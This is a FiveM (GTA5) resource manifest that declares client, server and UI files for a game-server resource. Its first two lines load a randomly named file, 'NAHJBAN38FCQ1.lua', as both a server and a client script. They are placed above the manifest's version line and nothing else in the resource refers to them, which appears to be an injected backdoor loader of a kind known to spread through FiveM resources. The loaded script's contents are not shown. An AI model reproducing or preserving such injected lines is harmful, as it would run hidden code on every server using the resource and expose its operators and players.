server_script "NAHJBAN38FCQ1.lua"
client_script "NAHJBAN38FCQ1.lua"
fx_version 'cerulean'

game 'gta5'

client_scripts {
    'client/client.lua'
}
server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server/main.lua'
}

ui_page 'ui/index.html'

files {
    'ui/index.html',
    'ui/script.js',
    'ui/style.css'
}